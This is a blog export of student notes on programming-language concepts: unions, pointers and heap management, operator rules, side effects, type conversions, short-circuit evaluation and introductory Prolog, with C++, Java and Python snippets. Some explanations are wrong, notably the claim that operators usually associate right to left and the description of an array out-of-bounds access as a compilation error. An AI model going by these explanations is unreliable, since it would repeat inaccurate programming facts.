  <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="title class_">VariantNumber</span>&#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="type">float</span> f;</span><br><span class="line">    <span class="type">double</span> d;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">union</span> <span class="title class_">VariantNumber</span> num;</span><br><span class="line">    num.i = <span class="number">9</span>;</span><br><span class="line">    std::cout &lt;&lt; num.i &lt;&lt; std::endl;  <span class="comment">// 9</span></span><br><span class="line">    num.f = <span class="number">3.14</span>;</span><br><span class="line">    std::cout &lt;&lt; num.f &lt;&lt; std::endl;  <span class="comment">// 3.14</span></span><br><span class="line"></span><br><span class="line">    std::cout &lt;&lt; num.i &lt;&lt; std::endl;  <span class="comment">// unexpected value</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>Evaluation of Unions:</p>
<ol>
<li>Free unions are unsafe (do not allow type checking)</li>
<li><code>Java</code> and <code>C#</code> do not support because of the safety issues</li>
</ol>
</li>
</ul>
<h2 id="Heap-Management"><a href="#Heap-Management" class="headerlink" title="Heap Management"></a>Heap Management</h2><h3 id="Pointer"><a href="#Pointer" class="headerlink" title="Pointer"></a>Pointer</h3><ul>
<li><p>it stores the memory address of another variable or object in the program</p>
</li>
<li><p>it provides a power of <font color="3A75EA">indirect addressing</font> and a possibility of <font color="3A75EA">heap memory management</font></p>
</li>
<li><p>Lifetime</p>
<ul>
<li>a pointer is declared as a local variable within a function, then it is stored on the stack and destoried when the function is returned</li>
<li>a heap-dynamic variable is declared at runtime and remains valid until it is deallocated through <code>delete</code></li>
</ul>
</li>
<li><p>Pointer arithmetic</p>
<ul>
<li>the process of performing arithmetic operations on pointers  <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span>* c = <span class="keyword">new</span> <span class="type">char</span>[<span class="number">5</span>];</span><br><span class="line">std::cout &lt;&lt; (<span class="type">void</span>*)(c) &lt;&lt; std::endl;       <span class="comment">// 0x1c39eb0</span></span><br><span class="line">std::cout &lt;&lt; (<span class="type">void</span>*)(c + <span class="number">1</span>) &lt;&lt; std::endl;   <span class="comment">// 0x1c39eb1 (+1)</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span>* p = <span class="keyword">new</span> <span class="type">int</span>[<span class="number">5</span>]&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>&#125;;</span><br><span class="line">std::cout &lt;&lt; (p) &lt;&lt; std::endl;      <span class="comment">// 0x1c39ed0</span></span><br><span class="line">std::cout &lt;&lt; (p + <span class="number">1</span>) &lt;&lt; std::endl;  <span class="comment">// 0x1c39ed4 (+4)</span></span><br><span class="line">std::cout &lt;&lt; *(p + <span class="number">1</span>) &lt;&lt; std::endl; <span class="comment">// 2</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><strong>Problems</strong></p>
<ol>
<li><p>dangling pointers</p>
<ul>
<li>a pointer points to a heap-dynamic variable that has been deallocated <a href="https://donaldlamnl.github.io/myBlog/2022/09/18/2022/CSCI3150/2022-9-17-CSCI3150-SystemCall-Memory/">others</a>  <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Dog</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="type">char</span>* name;</span><br><span class="line">    <span class="built_in">Dog</span>()&#123; name = <span class="keyword">new</span> <span class="type">char</span>[<span class="number">5</span>]&#123;<span class="string">&quot;doge&quot;</span>&#125;; &#125;</span><br><span class="line">    <span class="comment">// solution: override the copy construction</span></span><br><span class="line">    ~<span class="built_in">Dog</span>()&#123; <span class="keyword">delete</span> [] name; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    Dog* a = <span class="keyword">new</span> Dog;</span><br><span class="line">    Dog* b = <span class="keyword">new</span> <span class="built_in">Dog</span>(*a);   <span class="comment">// it is a shallow copy of a</span></span><br><span class="line">    <span class="keyword">delete</span> a;</span><br><span class="line">    std::cout &lt;&lt; b-&gt;name &lt;&lt; std::endl;  <span class="comment">// the name has already been deallocated</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>lost heap-dynamic variable</p>
<ul>
<li>an allocated heap-dynamic variable that is no longer accessible (it would lead to memory leak)  <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span>* p = <span class="keyword">new</span> <span class="type">int</span>;</span><br><span class="line">p = <span class="keyword">new</span> <span class="type">int</span>;    <span class="comment">// create a new int and force p points to it</span></span><br><span class="line"><span class="keyword">delete</span> p;   <span class="comment">// cannot delete the new int that declared on the top</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
</li>
<li><p><strong>Solutions</strong> for dangling pointers</p>
<ol>
<li><p>Tombstone</p>
<ul>
<li>adding an extra heap cell (a pointer) to the heap-dynamic variable</li>
</ul>
 <img src="https://p.ipic.vip/1zz58f.png" width="500px" />

<ol>
<li>the actual pointer variable points only at the tombstone (a middleware among the variable and pointers)</li>
<li>when a heap-dynamic variable is deallocated, the tombstone remains but points to null</li>
</ol>
</li>
<li><p>Locks-and-keys</p>
<ul>
<li>the pointer values are represents as (key, address) and the heap-dynamic variables are represents as (key, values) <img src="https://p.ipic.vip/phxapn.png" width="500px" /></li>
</ul>
<ol>
<li>when a heap-dynamic variable is allocated and assigned to a pointer, a unique value is created and assigned to both pointer’s and variable’s key</li>
<li>when we use the pointer to access the corresponding variable, it would compare the key value first to check whether the access is legal or not</li>
<li>when the heap-dynamic variable is deallocated, the lock value is cleared to an illegal lock value to make sure it won’t be access</li>
</ol>
</li>
</ol>
</li>
</ul>
<h3 id="References"><a href="#References" class="headerlink" title="References"></a>References</h3><ul>
<li>reference type variable is similar to pointer but it only <font color="3A75EA">refers to an object</font> in memory instead of an address  <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">a</span> <span class="operator">=</span> <span class="string">&quot;haha&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">b</span> <span class="operator">=</span> a;</span><br><span class="line"><span class="type">String</span> <span class="variable">c</span> <span class="operator">=</span> <span class="string">&quot;hehe&quot;</span>;</span><br><span class="line">b = c;  <span class="comment">// it would not change the value of a</span></span><br><span class="line">System.out.println(a);  <span class="comment">// haha</span></span><br></pre></td></tr></table></figure>
  <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> a = <span class="number">1</span>;</span><br><span class="line"><span class="type">int</span>&amp; b = a;</span><br><span class="line"><span class="type">int</span> c = <span class="number">2</span>;</span><br><span class="line">b = c;  <span class="comment">// it does change the value of a</span></span><br><span class="line">std::cout &lt;&lt; a &lt;&lt; std::endl;  <span class="comment">// 2</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="Implicit-Heap-Management"><a href="#Implicit-Heap-Management" class="headerlink" title="Implicit Heap Management"></a>Implicit Heap Management</h3><ol>
<li>Reference Counter<ul>
<li>maintain a reference counter in every cell, which stores the number of pointers currently pointing at the cell</li>
<li>when a pointer is disconnect from the cell, the counter is decreased by one and check for the zero value</li>
<li>if the counter value is 0 which means no pointers are pointing to it, then it would deallocate the memory</li>
</ul>
</li>
</ol>
<!-- 
<font color="3A75EA">Blue</font>
<font color="F54747">Red</font>
-->
]]></content>
      <categories>
        <category>CSCI3180</category>
      </categories>
      <tags>
        <tag>Principles</tag>
      </tags>
  </entry>
  <entry>
    <title>Expressions and Assignment Statements</title>
    <url>/myBlog/2023/03/13/2023/CSCI3180/2023-3-13-CSCI3180-Expressions-Assignment-Statements/</url>
    <content><![CDATA[<h2 id="Arithmetic-Expressions"><a href="#Arithmetic-Expressions" class="headerlink" title="Arithmetic Expressions"></a>Arithmetic Expressions</h2><ul>
<li>consist of <font color="3A75EA">operators</font>, <font color="3A75EA">operands</font> and <font color="3A75EA">parentheses</font></li>
</ul>
<h3 id="Operators"><a href="#Operators" class="headerlink" title="Operators"></a>Operators</h3><ul>
<li>can be <font color="3A75EA">infix</font>, <font color="3A75EA">prefix</font>, or <font color="3A75EA">postfix</font> (most of them are infix)<ol>
<li><p><strong>Unary Operator</strong>: has one operator</p>
<ul>
<li><code>i++</code>, <code>--i</code></li>
</ul>
</li>
<li><p><strong>Binary Operator</strong>: has two operators</p>
<ul>
<li><code>a + b</code></li>
</ul>
</li>
<li><p><strong>Ternary Operator</strong>: has three operators</p>
<ul>
<li><code>a ? b : c</code></li>
</ul>
</li>
</ol>
</li>
</ul>
<h4 id="Operator-Precedence-Rules"><a href="#Operator-Precedence-Rules" class="headerlink" title="Operator Precedence Rules"></a>Operator Precedence Rules</h4><ul>
<li>determines the order in which operators are evaluated in an expression</li>
<li>Typical precedence levels:<ol>
<li>Parentheses <code>()</code></li>
<li>Exponentiation <code>**</code> or <code>^</code></li>
<li>Multiplication <code>*</code>, <code>/</code></li>
<li>Addition &amp; Subtraction <code>+</code> &amp; <code>-</code></li>
</ol>
</li>
</ul>
<h4 id="Operator-Associativity-Rule"><a href="#Operator-Associativity-Rule" class="headerlink" title="Operator Associativity Rule"></a>Operator Associativity Rule</h4><ul>
<li>refers to the order in which operators with the <strong>same precedence</strong> are evaluated in an expression</li>
<li>Typical associativity rules:<ul>
<li><font color="F54747">right to left</font> (except exponentiation <code>**</code>)  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">2</span> ** <span class="number">2</span> ** <span class="number">3</span> <span class="comment"># 256</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><font color="F54747"><strong>Remind:</strong></font> APL is different: all operators have <font color="3A75EA">equal precedence</font> and all operators <font color="3A75EA">associate right to left</font>  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2 * 5 + 7   ⍝ 24</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="Operand"><a href="#Operand" class="headerlink" title="Operand"></a>Operand</h3><ol>
<li>Variable</li>
<li>Constant</li>
<li>Parenthesized expression</li>
<li>Function call</li>
</ol>
<h4 id="Side-Effecr"><a href="#Side-Effecr" class="headerlink" title="Side Effecr"></a>Side Effecr</h4><ul>
<li><p>it occurs when a function changes a two-way parameter, a non-local variable, or a static-storage variable</p>
<ol>
<li><p>updated a non-local variable</p>
 <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">fun</span><span class="params">(<span class="type">int</span>&amp; x)</span></span>&#123;</span><br><span class="line">    x += <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> x * <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> a = <span class="number">0</span>;</span><br><span class="line">    cout &lt;&lt; a + <span class="built_in">fun</span>(a) &lt;&lt; endl; <span class="comment">// 3 (expected: 2)</span></span><br><span class="line">    <span class="type">int</span> b = <span class="number">0</span>;</span><br><span class="line">    cout &lt;&lt; b + <span class="number">1</span> + <span class="built_in">fun</span>(b) &lt;&lt; endl; <span class="comment">// 3 (the expect value is not previous + 1)</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>updated a static-storage variable</p>
 <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> g = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">fun</span><span class="params">(<span class="type">int</span> b)</span></span>&#123;</span><br><span class="line">    g += <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">2</span> * b * g;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    cout &lt;&lt; <span class="built_in">fun</span>(<span class="number">2</span>) &lt;&lt; endl; <span class="comment">// 8</span></span><br><span class="line">    cout &lt;&lt; <span class="built_in">fun</span>(<span class="number">2</span>) &lt;&lt; endl; <span class="comment">// 12 (the expect value is not same as previous)</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
</li>
<li><p><strong>Solutions</strong></p>
<ol>
<li>disallow functional side effects<ul>
<li>No two-way parameters in functions</li>
<li>No static-storage &#x2F; non-local assignable variable access in function</li>
<li><strong>Disadvantages</strong>: Inflexibility</li>
</ul>
</li>
</ol>
</li>
</ul>
<h3 id="Referential-Transparency"><a href="#Referential-Transparency" class="headerlink" title="Referential Transparency"></a>Referential Transparency</h3><ul>
<li><p>if it always produces the same result for a given set of input parameters, and its result does not depend on any external state or side effects.</p>
<ul>
<li>the function is referential transparency if <code>result1</code> and <code>result2</code> are equivalent  <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">result1 = (<span class="built_in">fun</span>(a) + b) / (<span class="built_in">fun</span>(a) - c)</span><br><span class="line">temp = <span class="built_in">fun</span>(a)</span><br><span class="line">result2 = (temp + b) / (temp - c)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><strong>Advantages</strong></p>
<ul>
<li>much easier to understand as they do not have variables</li>
</ul>
</li>
</ul>
<h2 id="Overloaded-Operators"><a href="#Overloaded-Operators" class="headerlink" title="Overloaded Operators"></a>Overloaded Operators</h2><ul>
<li><p>an operator can work for more than one data type or class</p>
<ul>
<li><code>1 + 2</code>: work for int</li>
<li><code>1.1 + 2.2</code>: also work for float</li>
<li><code>&amp;a</code>: getting the address of a</li>
<li><code>a&amp;b</code>: logic and operation</li>
</ul>
</li>
<li><p><code>C++</code>, <code>C#</code>, and <code>F#</code> allow user-defined overloaded operators</p>
<ul>
<li><p>When sensibly used, such operators can be an aid to readability</p>
</li>
<li><p><strong>Potential problems</strong>:</p>
<ol>
<li>users can define nonsense operations</li>
<li>readability may suffer, even when the operators make sense</li>
</ol>
  <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> std::cout;</span><br><span class="line"><span class="keyword">using</span> std::endl;</span><br><span class="line"><span class="keyword">using</span> std::ostream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Vector</span>&#123;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">Vector</span>(<span class="type">float</span> x, <span class="type">float</span> y, <span class="type">float</span> z) : <span class="built_in">x</span>(x), <span class="built_in">y</span>(y), <span class="built_in">z</span>(z) &#123; &#125;</span><br><span class="line">    Vector <span class="keyword">operator</span>+(<span class="type">const</span> Vector&amp; another)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">Vector</span>(x+another.x, y+another.y, z+another.z);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">float</span> <span class="title">getX</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> x; &#125;</span><br><span class="line">    <span class="function"><span class="type">float</span> <span class="title">getY</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> y; &#125;</span><br><span class="line">    <span class="function"><span class="type">float</span> <span class="title">getZ</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> z; &#125;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="type">float</span> x, y, z;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">ostream&amp; <span class="keyword">operator</span>&lt;&lt;(ostream&amp; os, Vector v)&#123;</span><br><span class="line">    os &lt;&lt; <span class="string">&quot;(&quot;</span> &lt;&lt; v.<span class="built_in">getX</span>() &lt;&lt; <span class="string">&quot;,&quot;</span> &lt;&lt; v.<span class="built_in">getY</span>() &lt;&lt; <span class="string">&quot;,&quot;</span> &lt;&lt; v.<span class="built_in">getZ</span>() &lt;&lt; <span class="string">&quot;)&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> os;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="function">Vector <span class="title">a</span><span class="params">(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>)</span>, <span class="title">b</span><span class="params">(<span class="number">2</span>,<span class="number">4</span>,<span class="number">6</span>)</span></span>;</span><br><span class="line">    Vector c = a + b;</span><br><span class="line">    cout &lt;&lt; a &lt;&lt; <span class="string">&quot; + &quot;</span> &lt;&lt; b &lt;&lt; <span class="string">&quot; = &quot;</span> &lt;&lt; c &lt;&lt; endl; <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<h2 id="Type-Conversions"><a href="#Type-Conversions" class="headerlink" title="Type Conversions"></a>Type Conversions</h2><ol>
<li><p><font color="3A75EA"><strong>narrowing conversion</strong></font> (Not allow in <code>Java</code>)</p>
<ul>
<li>the converted object cannot include all of the values of the original type by the programming language</li>
<li><code>float</code> to <code>int</code></li>
</ul>
</li>
<li><p><font color="3A75EA"><strong>widening conversion</strong></font></p>
<ul>
<li>the converted object can include <em>at least approximations</em> to all of the values of the original type</li>
<li><code>int</code> to <code>float</code></li>
</ul>
</li>
</ol>
<h3 id="Implicit-Type-Conversions"><a href="#Implicit-Type-Conversions" class="headerlink" title="Implicit Type Conversions"></a>Implicit Type Conversions</h3><ul>
<li>automatic conversion of a value from one data type to another  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="number">42</span></span><br><span class="line">b = <span class="number">3.14</span></span><br><span class="line">c = a + b</span><br><span class="line"><span class="built_in">print</span>(c)   <span class="comment"># 45.14 (a is automatically converted to float)</span></span><br></pre></td></tr></table></figure></li>
<li><strong>Advantage</strong>: convenience</li>
<li><strong>Disadvantage</strong>: reliability (lower the error detection ability of the compiler)</li>
</ul>
<h3 id="Explicit-Type-Conversions"><a href="#Explicit-Type-Conversions" class="headerlink" title="Explicit Type Conversions"></a>Explicit Type Conversions</h3><ul>
<li>manual conversion of a value from one data type to another by the programmer</li>
<li><code>int(variable)</code> or <code>(int)variable</code>: depend on language  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="string">&quot;42&quot;</span></span><br><span class="line">b = <span class="built_in">float</span>(a)</span><br><span class="line"><span class="built_in">print</span>(b) <span class="comment"># 42.0</span></span><br></pre></td></tr></table></figure>
  <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">double</span> <span class="variable">c</span> <span class="operator">=</span> <span class="number">3.14</span>;</span><br><span class="line"><span class="type">int</span> <span class="variable">d</span> <span class="operator">=</span> (<span class="type">int</span>) c;</span><br><span class="line">System.out.println(d); <span class="comment">// 3</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="Relational-and-Boolean-Expressions"><a href="#Relational-and-Boolean-Expressions" class="headerlink" title="Relational and Boolean Expressions"></a>Relational and Boolean Expressions</h2><h3 id="Relational-Expressions"><a href="#Relational-Expressions" class="headerlink" title="Relational Expressions"></a>Relational Expressions</h3><ul>
<li>the comparation of two operands with one relational operator and evaluate to <code>Boolean</code></li>
<li>some operator symbols which vary among languages (<code>!=</code>, <code>ne</code>, <code>&lt;&gt;</code>) </li>
<li><code>JavaScript</code> and <code>PHP</code> have two additional relational operator <code>===</code> and <code>!==</code>  <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span> == <span class="number">1.0</span>    <span class="comment">// true</span></span><br><span class="line"><span class="number">1</span> == <span class="string">&#x27;1&#x27;</span>    <span class="comment">// true</span></span><br><span class="line"><span class="number">1</span> == <span class="literal">true</span>   <span class="comment">// true</span></span><br><span class="line"><span class="number">1</span> === <span class="number">1.0</span>   <span class="comment">// true (javascript only has number type)</span></span><br><span class="line"><span class="number">1</span> === <span class="string">&#x27;1&#x27;</span>   <span class="comment">// false</span></span><br><span class="line"><span class="number">1</span> === <span class="literal">true</span>  <span class="comment">// false</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="Boolean-Expressions"><a href="#Boolean-Expressions" class="headerlink" title="Boolean Expressions"></a>Boolean Expressions</h3><ul>
<li><p>The operands and the result are all <code>Boolean</code></p>
<ul>
<li><code>C</code>, <code>C++</code>, <code>Java</code>: <code>&amp;&amp;</code>, <code>||</code></li>
<li><code>Python</code>: <code>and</code>, <code>or</code></li>
</ul>
</li>
<li><p>Traditional C: Boolean <code>true</code> value is <code>1</code> whereas Boolean <code>false</code> value is <code>0</code></p>
</li>
<li><p>Chain comparison:</p>
  <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">bool</span> re = <span class="number">3</span> &gt; <span class="number">2</span> &gt; <span class="number">1</span>;    <span class="comment">// false</span></span><br></pre></td></tr></table></figure>
  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">re = <span class="number">3</span> &gt; <span class="number">2</span> &gt; <span class="number">1</span>     <span class="comment"># True</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="Short-Circuit-Evaluation"><a href="#Short-Circuit-Evaluation" class="headerlink" title="Short-Circuit Evaluation"></a>Short-Circuit Evaluation</h2><ul>
<li><p>an expression in which the result is determined <font color="3A75EA">without evaluating all of the operands and&#x2F;or operators</font></p>
<ul>
<li><code>(87 * a) * (b / 17 - 9)</code>: if <code>a</code> is <code>0</code>, then no need to evaluate <code>(b / 17 - 9)</code></li>
<li><code>A &amp;&amp; B</code>: if <code>A</code> is <code>false</code>, then no need to evaluate <code>B</code></li>
<li><code>A || B</code>: if <code>A</code> is <code>true</code>, then no need to evaluate <code>B</code></li>
</ul>
</li>
<li><p>bitwise Boolean operators that are <font color="F54747">not short-circuit</font>: <code>&amp;</code> and <code>|</code></p>
</li>
<li><p><strong>Advantages</strong>: efficiency (save the compilation power)</p>
</li>
<li><p><strong>Condition</strong>: program correctness</p>
<ul>
<li>if we use the <code>&amp;</code> operator that doest not has short-circult  <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">    <span class="type">int</span>[] a = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;;</span><br><span class="line">    <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(index &lt; a.length &amp; a[index] != <span class="number">1337</span>)&#123;</span><br><span class="line">        index++;</span><br><span class="line">    &#125;</span><br><span class="line">    System.out.println(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li>it is <font color="F54747">compilation error</font>, because when <code>index</code> is 4, <code>a[index]</code> does not exist</li>
</ul>
</li>
<li><p><font color="F54747"><strong>Potential error</strong></font>: <code>(a &gt; b) || (b++ / 5)</code> if <code>(a &gt; b)</code> is <code>true</code>, <code>b++</code> does not be executed</p>
</li>
</ul>
<h2 id="Assignment-Statements"><a href="#Assignment-Statements" class="headerlink" title="Assignment Statements"></a>Assignment Statements</h2><ul>
<li><p>General Syntax: <code>&lt;target_variable&gt; &lt;assignment_operator&gt; &lt;expression&gt;</code></p>
</li>
<li><p>Assignment Operators</p>
<ul>
<li>Most of languages: <code>=</code></li>
<li>Pascal and Ada: <code>:=</code></li>
</ul>
</li>
<li><p><strong>Conditional Targets</strong></p>
  <figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">($dog_lover ? $dog_is_da_best : $cat_is_da_best) = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># is equivalent to</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($dog_lover) &#123;</span><br><span class="line">    $dog_is_da_best = <span class="number">1</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $cat_is_da_best = <span class="number">1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>Compound Assignment Operators</strong></p>
<ul>
<li>a shorthand method of specifying a commonly needed form of assignment<ul>
<li><code>a = a + b</code> can be simply written as <code>a += b</code></li>
</ul>
</li>
</ul>
</li>
<li><p><strong>Multiple Assignments</strong></p>
<ul>
<li>Python, Perl, and Ruby allow multiple-target multiple-source assignments<ul>
<li><code>a, b, c = 1, 2, 3</code>: assign <code>1</code>, <code>2</code>, <code>3</code> to <code>a</code>, <code>b</code>, <code>c</code></li>
<li><code>a, b = b, a</code>: swap <code>a</code>, <code>b</code></li>
</ul>
</li>
</ul>
</li>
<li><p><strong>Mixed-Mode Assignment</strong></p>
<ul>
<li>allows values of different types to be assigned to each other  <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> x = <span class="number">5</span>;</span><br><span class="line"><span class="type">double</span> y = <span class="number">3.14</span>;</span><br><span class="line">x = y;    <span class="comment">// y is implicitly converted to int, x = 3</span></span><br><span class="line">y = x;    <span class="comment">// x is implicitly converted to double, y = 5.0</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<!-- 
<font color="3A75EA">Blue</font>
<font color="F54747">Red</font>
-->
]]></content>
      <categories>
        <category>CSCI3180</category>
      </categories>
      <tags>
        <tag>Principles</tag>
      </tags>
  </entry>
  <entry>
    <title>Logic Programming</title>
    <url>/myBlog/2023/04/28/2023/CSCI3180/2023-4-28-CSCI3180-Logic-Programming/</url>
    <content><![CDATA[<h2 id="Declarative-Programming"><a href="#Declarative-Programming" class="headerlink" title="Declarative Programming"></a>Declarative Programming</h2><ol>
<li><p>Imperative (Conventional) Languages Properties</p>
<ul>
<li><font color="3A75EA">State-oriented</font>: each statement execution changes the abstract machine state</li>
<li><font color="3A75EA">Destructive assignment</font>: update the value</li>
<li><font color="3A75EA">Side effects</font></li>
<li>Difficult to read, write, and verify programs</li>
</ul>
</li>
<li><p>Declarative languages</p>
<ul>
<li>Higher program understandability and verifiability</li>
<li>Referential transparency: no side effect</li>
</ul>
</li>
</ol>
<h2 id="Prolog"><a href="#Prolog" class="headerlink" title="Prolog"></a>Prolog</h2><ul>
<li><p>Divided into two stages:</p>
<ol>
<li>Building a program (asserting what is true)</li>
<li>Running a program (asking for consequences of what has been asserted)</li>
</ol>
</li>
<li><p>A Prolog program is a collection of <font color="3A75EA">assertions</font></p>
<ol>
<li><font color="F54747">Facts</font></li>
<li><font color="F54747">Rules</font><br>  They are used to express relationships amongst some objects</li>
</ol>
</li>
</ul>
<h3 id="Facts"><a href="#Facts" class="headerlink" title="Facts"></a>Facts</h3><ul>
<li><p>a statement that <font color="3A75EA">asserts a relationship between objects</font></p>
</li>
<li><p>Facts can be of <font color="3A75EA">various arities</font></p>
  <figure class="highlight prolog"><table><tr><td class="code"><pre><span class="line">father(edwyn, caroline).    <span class="comment">/* &quot;Edwyn is the father of Caroline.&quot; */</span></span><br><span class="line">give(tom, apple, teacher).  <span class="comment">/* &quot;Tom gives an apple to the teacher.&quot; */</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>Unary facts denote <font color="3A75EA">properties</font></p>
  <figure class="highlight prolog"><table><tr><td class="code"><pre><span class="line">red(apple).     <span class="comment">/* &quot;Apple is red.&quot; */</span></span><br><span class="line">number(three).  <span class="comment">/* &quot;Three is a number.&quot; */</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="Query"><a href="#Query" class="headerlink" title="Query"></a>Query</h3><ul>
<li><p>Prolog is executed by posting a question (<font color="F54747">query</font>), which makes a request for information based on the facts and rules defined in a program.</p>
<ul>
<li>provided facts  <figure class="highlight prolog"><table><tr><td class="code"><pre><span class="line">father(george, randy).</span><br><span class="line">mother(kari, peter).</span><br><span class="line">father(randy, kari).</span><br><span class="line">mother(kari, mary).</span><br></pre></td></tr></table></figure></li>
<li>query  <figure class="highlight prolog"><table><tr><td class="code"><pre><span class="line">?- father(george, randy).  <span class="comment">/* yes */</span></span><br><span class="line">?- mother(kari, june).  <span class="comment">/* no */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Is there an X such that X is the father of randy ? */</span></span><br><span class="line">?- father(<span class="symbol">X</span>, randy).</span><br><span class="line"><span class="comment">/* X = george */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Is there an X such that Kari is the mother of X ? */</span></span><br><span class="line">?- mother(kari, <span class="symbol">X</span>).</span><br><span class="line"><span class="comment">/* X = mary;</span></span><br><span class="line"><span class="comment">   X = peter */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Are there X and Y such that X is the father of Y ? */</span></span><br><span class="line">?- father(<span class="symbol">X</span>, <span class="symbol">Y</span>).</span><br><span class="line"><span class="comment">/* X = randy        X = george</span></span><br><span class="line"><span class="comment">   Y = kari;        Y = randy */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Is there an X such that X is the mother of him/herself ? */</span></span><br><span class="line">?- mother(<span class="symbol">X</span>, <span class="symbol">X</span>).</span><br><span class="line"><span class="comment">/* no */</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
